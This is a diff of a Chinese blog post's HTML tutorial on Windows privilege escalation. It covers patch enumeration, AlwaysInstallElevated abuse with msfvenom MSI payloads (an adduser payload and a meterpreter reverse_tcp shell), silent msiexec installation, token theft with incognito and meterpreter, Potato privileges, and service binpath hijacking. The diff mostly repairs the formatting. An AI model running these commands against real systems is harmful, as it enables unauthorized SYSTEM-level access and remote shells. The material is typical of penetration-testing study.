@@ -11,7 +11,7 @@
   <meta itemprop="name" content="windows权限提升">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="515">
+  <meta itemprop="wordCount" content="477">
   <meta itemprop="keywords" content="攻防,提权,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/54/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="windows权限提升">
@@ -38,7 +38,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/54\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 提权, 内网渗透","wordcount":  515 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 提权, 内网渗透","wordcount":  477 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/54\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -145,7 +145,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Windows权限提升</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="515 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="477 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -153,18 +153,32 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
+    <li><a href="#incognito">incognito</a></li>
+    <li><a href="#通过令牌窃取到trustedinstaller权限">通过令牌窃取到TrustedInstaller权限</a></li>
+    <li><a href="#土豆">土豆</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#不安全的服务权限">不安全的服务权限</a></li>
+    <li><a href="#服务注册表权限可控">服务注册表权限可控</a></li>
+    <li><a href="#未引用的服务路径">未引用的服务路径</a></li>
+  </ul>
+
+  <ul>
     <li>
       <ul>
-        <li></li>
+        <li><a href="#uac白名单">UAC白名单</a></li>
+        <li><a href="#dll劫持">DLL劫持</a></li>
+        <li><a href="#模拟可信任目录">模拟可信任目录</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="内核提权" class="heading-element"><span>0.0.0.1  内核提权</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="内核提权" class="heading-element"><span>内核提权</span>
   <a href="#%e5%86%85%e6%a0%b8%e6%8f%90%e6%9d%83" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>在进行提权工作时，确定操作系统的<code>内核版本</code>以及<code>补丁编号</code>是首要目标。</p>
+</h1><p>在进行提权工作时，确定操作系统的<code>内核版本</code>以及<code>补丁编号</code>是首要目标。</p>
 <p>在目标主机上执行以下命令，可查看已安装的系统补丁：</p>
 <pre tabindex="0"><code>systeminfo</code></pre><p>根据所列出的补丁号以及系统版本等信息，可借助相关<a href="https://i.hacking8.com/tiquan"target="_blank" rel="external nofollow noopener noreferrer">提权辅助网站</a>进行查询以找出相对应的漏洞。</p>
 <p>使用WES-NG提权</p>
@@ -180,44 +194,35 @@
 <pre tabindex="0"><code>python3 wes.py --update</code></pre></li>
 <li>
 <p>在目标主机上执行systeminfo命令，并将结果保存在sysinfo.txt文件中。然后在主机上执行以下命令：</p>
-<pre tabindex="0"><code>python3 wes.py sysinfo.txt --impact &#34;Elevation of Privilege&#34;</code></pre></li>
+<pre tabindex="0"><code>python3 wes.py sysinfo.txt --impact &#34;Elevation of Privilege&#34;
+# --impact指定漏洞类型为提权漏洞</code></pre></li>
 </ol>
-<h5 id="--impact指定漏洞类型为提权漏洞" class="heading-element"><span>0.0.0.2  &ndash;impact指定漏洞类型为提权漏洞</span>
-  <a href="#--impact%e6%8c%87%e5%ae%9a%e6%bc%8f%e6%b4%9e%e7%b1%bb%e5%9e%8b%e4%b8%ba%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e" class="heading-mark">
+<h1 id="msi安装策略提权" class="heading-element"><span>MSI安装策略提权</span>
+  <a href="#msi%e5%ae%89%e8%a3%85%e7%ad%96%e7%95%a5%e6%8f%90%e6%9d%83" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><pre tabindex="0"><code>
-
-
-##### MSI安装策略提权
-
-&gt; `MSI`（microsoft installer）是Windows Installer的安装包，它实际上是一个数据库，包含安装一种产品所需要的信息和在很多安装情形下安装（和卸载）程序所需的指令和数据。MSI文件将程序的组成文件与功能关联起来。
-
-MSI文件提权，即任意用户以SYSTEM权限安装MSI文件造成提权。AlwaysInstallElevated是注册表的一个键值，当其值为1时候，在系统中使用Windows Installer安装任何程序，允许非特权用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权限执行任意payload。
-
-MSF集成了漏洞利用模块：exploit/windows/local/always_install_elevated 。详细利用步骤如下：
-
-
-
-- 激活AlwaysInstallElevated
-
-方法一：在“运行”中输入*gpedit.msc*，从而打开`本地组策略编辑器`，本地组策略（gpedit.msc）：计算机配置–管理模板–Windows组件–Windows Installer，点击启用“始终以提升的权限进行安装”；用户配置–管理模板–Windows组件–Windows Installer，点击启用“始终以提升的权限进行安装”。
-
-方法二：cmd修改注册表（rgedit）
-
-```dockerfile
-查询
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
-修改
-reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</code></pre><p>使用msfvenom生成恶意程序上传</p>
+</h1><blockquote>
+<p><code>MSI</code>（microsoft installer）是Windows Installer的安装包，它实际上是一个数据库，包含安装一种产品所需要的信息和在很多安装情形下安装（和卸载）程序所需的指令和数据。MSI文件将程序的组成文件与功能关联起来。</p>
+</blockquote>
+<p>MSI文件提权，即任意用户以SYSTEM权限安装MSI文件造成提权。AlwaysInstallElevated是注册表的一个键值，当其值为1时候，在系统中使用Windows Installer安装任何程序，允许非特权用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权限执行任意payload。</p>
+<p>MSF集成了漏洞利用模块：exploit/windows/local/always_install_elevated 。详细利用步骤如下：</p>
+<ul>
+<li>激活AlwaysInstallElevated</li>
+</ul>
+<p>方法一：在“运行”中输入<em>gpedit.msc</em>，从而打开<code>本地组策略编辑器</code>，本地组策略（gpedit.msc）：计算机配置–管理模板–Windows组件–Windows Installer，点击启用“始终以提升的权限进行安装”；用户配置–管理模板–Windows组件–Windows Installer，点击启用“始终以提升的权限进行安装”。</p>
+<p>方法二：cmd修改注册表（rgedit）</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span>查询
+</span></span><span style="display:flex;"><span>reg query HKCU<span style="color:#a6be9d">\S</span>OFTWARE<span style="color:#a6be9d">\P</span>olicies<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\I</span>nstaller /v AlwaysInstallElevated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>修改
+</span></span><span style="display:flex;"><span>reg add HKCU<span style="color:#a6be9d">\S</span>OFTWARE<span style="color:#a6be9d">\P</span>olicies<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\I</span>nstaller /v AlwaysInstallElevated /t REG_DWORD /d <span style="color:#a6be9d">1</span></span></span></code></pre></div><p>使用msfvenom生成恶意程序上传</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>增加管理员  msfvenom -p windows/adduser <span style="color:#58a1dd">USER</span><span style="color:#ff636f">=</span>test000 <span style="color:#58a1dd">PASSWORD</span><span style="color:#ff636f">=</span>password123! -f msi -o exp.msi
 </span></span><span style="display:flex;"><span>获得system会话 msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span> <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span> -f msi -o exp.msi</span></span></code></pre></div><p>msiexec运行MSI文件</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msiexec /quiet /qn /i exp.msi</span></span></code></pre></div><h5 id="访问令牌操纵" class="heading-element"><span>0.0.0.3  访问令牌操纵</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msiexec /quiet /qn /i exp.msi</span></span></code></pre></div><h1 id="访问令牌操纵" class="heading-element"><span>访问令牌操纵</span>
   <a href="#%e8%ae%bf%e9%97%ae%e4%bb%a4%e7%89%8c%e6%93%8d%e7%ba%b5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>Windows的访问控制模型由<strong>AT</strong>与<strong>SD</strong>组成。我们这里主要讲述如何运用<code>AT</code>在Windows下提权</p>
 </blockquote>
 <p>在Windows当中令牌通常可以分为<code>主令牌</code>（Primary Token）和<code>模拟令牌</code>（Impersonation Token）两种。</p>
@@ -232,11 +237,11 @@ reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEleva
 <p>==通常情况下，测试人员通过操纵访问令牌，可以使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程，例如system用户。这个过程就被称之为<em>令牌窃取</em>。==</p>
 <p>==令牌窃取只能在特权用户上下文中才能完成。这里的特权用户通常为<strong>系统管理员账户</strong>、<strong>网络服务账户</strong>和<strong>系统服务账户</strong>（例如：IIS、MYSQL）。==</p>
 <p>令牌窃取往往用来将<strong>管理员</strong>权限提升到<strong>system</strong>权限或者是<strong>TrustedInstaller</strong>权限。</p>
-<h6 id="incognito" class="heading-element"><span>0.0.0.3.1  incognito</span>
+<h2 id="incognito" class="heading-element"><span>incognito</span>
   <a href="#incognito" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><strong>1.incognito</strong></p>
+</h2><p><strong>1.incognito</strong></p>
 <p>程序地址：https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</p>
 <p>AccessToken的列举(需要 administrator 权限)</p>
 <pre tabindex="0"><code>incognito.exe list_tokens -u</code></pre><p>要使用 AccessToken 模拟其他用户，可以使用命令</p>
@@ -244,11 +249,11 @@ reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEleva
 <pre tabindex="0"><code>incognito.exe execute -c &#34;NT AUTHORITY\SYSTEM&#34; cmd.exe</code></pre><p>降权至当前用户：</p>
 <pre tabindex="0"><code>incognito.exe execute -c &#34;当前用户 token&#34; cmd.exe</code></pre><p>获取域普通用户</p>
 <pre tabindex="0"><code>incognito.exe execute -c &#34;icsec\test&#34; cmd.exe</code></pre><p><strong>2.MSF</strong> <strong>下的</strong> <strong>incognito</strong> <strong>模块</strong></p>
-<pre tabindex="0"><code>##### 加载incognito模块
+<pre tabindex="0"><code># 加载incognito模块
 load incognito
-#####列出目标主机的所有访问令牌
+#列出目标主机的所有访问令牌
 list_tokens -u
-##### 窃取NT AUTHORITY\SYSTEM账户的令牌
+# 窃取NT AUTHORITY\SYSTEM账户的令牌
 impresonate_token &#34;NT AUTHORITY\SYSTEM&#34;
 
 
@@ -289,11 +294,11 @@ impersonate_token 12SERVER-01\Administrator #假冒 12server-01\adminstrator 的
 impersonate_token moonsec\\test #假冒 icsec\test的令牌
 impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #假冒 System 的令牌</code></pre><p>除了可以伪造令牌 也可以从进程里窃取令牌 首先使用 ps 命令列出进程 查看进程用户使用 steal_token pid 窃取令牌就有对应的权限。</p>
 <p>从进程窃取令牌</p>
-<pre tabindex="0"><code>steal_token PID</code></pre><h6 id="通过令牌窃取到trustedinstaller权限" class="heading-element"><span>0.0.0.3.2  通过令牌窃取到TrustedInstaller权限</span>
+<pre tabindex="0"><code>steal_token PID</code></pre><h2 id="通过令牌窃取到trustedinstaller权限" class="heading-element"><span>通过令牌窃取到TrustedInstaller权限</span>
   <a href="#%e9%80%9a%e8%bf%87%e4%bb%a4%e7%89%8c%e7%aa%83%e5%8f%96%e5%88%b0trustedinstaller%e6%9d%83%e9%99%90" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>通常情况下我们认为在Linux系统中root权限是Linux中最高的权限，Windows当中system权限是最高权限。这句话前半部分是对的，但后半部分，在Windows中system权限并不是最高权限。在Windows系统下，即使拥有了system权限，也无法在Windows的系统文件中的某些文件中拥有写入权限。</p>
 </blockquote>
 <p>使用icacls命令可查看某个文件夹对于某些用户来说具有何种权限，发现在<strong>C:/windows/servicing</strong>文件夹下，TrustedInstaller拥有完全控制权限。</p>
@@ -310,11 +315,11 @@ impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #假冒 System 的令牌</code><
 <p>后使用以下命令，成功获取TrustedInstaller令牌。</p>
 <pre tabindex="0"><code>steal_token&lt;PID&gt;</code></pre></li>
 </ul>
-<h6 id="土豆" class="heading-element"><span>0.0.0.3.3  土豆</span>
+<h2 id="土豆" class="heading-element"><span>土豆</span>
   <a href="#%e5%9c%9f%e8%b1%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>使用Potato提权都需要下列两个特权中的一个。</p>
+</h2><p>使用Potato提权都需要下列两个特权中的一个。</p>
 <ul>
 <li>
 <p>SeImpersonatePrivilege（替换进程级令牌）</p>
@@ -325,11 +330,11 @@ impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #假冒 System 的令牌</code><
 </ul>
 <p>在实际渗透过程中，拿到webshell下，用户权限是IIS或者apache，或通过SQLi执行xp_cmdshell,此时手里的服务账户在进行操作时是低权限账户，而使用该提权手法可以直接获取SYSTEM权限</p>
 <p>显示当前用户权限：</p>
-<pre tabindex="0"><code>whoami /priv</code></pre><h5 id="系统服务提权" class="heading-element"><span>0.0.0.4  系统服务提权</span>
+<pre tabindex="0"><code>whoami /priv</code></pre><h1 id="系统服务提权" class="heading-element"><span>系统服务提权</span>
   <a href="#%e7%b3%bb%e7%bb%9f%e6%9c%8d%e5%8a%a1%e6%8f%90%e6%9d%83" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>开始具体介绍系统服务权限之前，有必要介绍一下windows当中的访问控制模型。</p>
 </blockquote>
 <p>Windows访问控制模型（Access Control Model，ACM）是Windows系统安全性的基础构件。而ACM中通常由访问令牌（Access Token，AT）和安全描述符（Security Descriptor，SD）两部分组成。</p>
@@ -354,11 +359,11 @@ impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #假冒 System 的令牌</code><
 </ul>
 </li>
 </ul>
-<h6 id="不安全的服务权限" class="heading-element"><span>0.0.0.4.1  不安全的服务权限</span>
+<h2 id="不安全的服务权限" class="heading-element"><span>不安全的服务权限</span>
   <a href="#%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84%e6%9c%8d%e5%8a%a1%e6%9d%83%e9%99%90" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在上文中我们介绍了ACL，而ACL中的各种ACE定义了<code>安全对象</code>的访问控制策略。而Windows也正是通过ACL来确定用户对其拥有什么样的权限，具体权限如下表：</p>
+</h2><p>在上文中我们介绍了ACL，而ACL中的各种ACE定义了<code>安全对象</code>的访问控制策略。而Windows也正是通过ACL来确定用户对其拥有什么样的权限，具体权限如下表：</p>
 <table>
 <thead>
 <tr>
@@ -407,160 +412,136 @@ impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #假冒 System 的令牌</code><
 <pre tabindex="0"><code>accesschk.exe /accepteula -uwcqv &#34;Authenticated Users&#34; *</code></pre></li>
 <li>
 <p>在找到缺陷后，执行以下命令上传payload。当服务重启时，payload会以高权限启动。</p>
-<pre tabindex="0"><code>sc config 服务名称 binpath= &#34;cmd.exe&#34;</code></pre></li>
+<pre tabindex="0"><code>sc config 服务名称 binpath= &#34;cmd.exe&#34;
+# binpath，指定服务的二进制文件路径，在“=”之后必须跟一个空格</code></pre></li>
+<li>
+<p>完成以上的步骤就对服务的二进制文件进行了替换，接下来的工作就是需要将<strong>服务重启</strong>。</p>
+<p>这里有两个思路，如果当前用户对服务拥有<code>SERVICE_STOP</code>和<code>SERVICE_STOP</code>权限，可以通过以下命令重启服务</p>
+<pre tabindex="0"><code>sc stop 服务名称
+sc start 服务名称</code></pre><p>如果没有以上两个权限，可以直接将目标主机重启来模拟服务重启的过程。</p>
+</li>
 </ol>
-<h5 id="binpath指定服务的二进制文件路径在之后必须跟一个空格" class="heading-element"><span>0.0.0.5  binpath，指定服务的二进制文件路径，在“=”之后必须跟一个空格</span>
-  <a href="#binpath%e6%8c%87%e5%ae%9a%e6%9c%8d%e5%8a%a1%e7%9a%84%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%96%87%e4%bb%b6%e8%b7%af%e5%be%84%e5%9c%a8%e4%b9%8b%e5%90%8e%e5%bf%85%e9%a1%bb%e8%b7%9f%e4%b8%80%e4%b8%aa%e7%a9%ba%e6%a0%bc" class="heading-mark">
+<h2 id="服务注册表权限可控" class="heading-element"><span>服务注册表权限可控</span>
+  <a href="#%e6%9c%8d%e5%8a%a1%e6%b3%a8%e5%86%8c%e8%a1%a8%e6%9d%83%e9%99%90%e5%8f%af%e6%8e%a7" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><pre tabindex="0"><code>
-3. 完成以上的步骤就对服务的二进制文件进行了替换，接下来的工作就是需要将**服务重启**。
-
-这里有两个思路，如果当前用户对服务拥有`SERVICE_STOP`和`SERVICE_STOP`权限，可以通过以下命令重启服务</code></pre><p>sc stop 服务名称
-sc start 服务名称</p>
-<pre tabindex="0"><code>
-如果没有以上两个权限，可以直接将目标主机重启来模拟服务重启的过程。
-
-
-
-###### 服务注册表权限可控
-
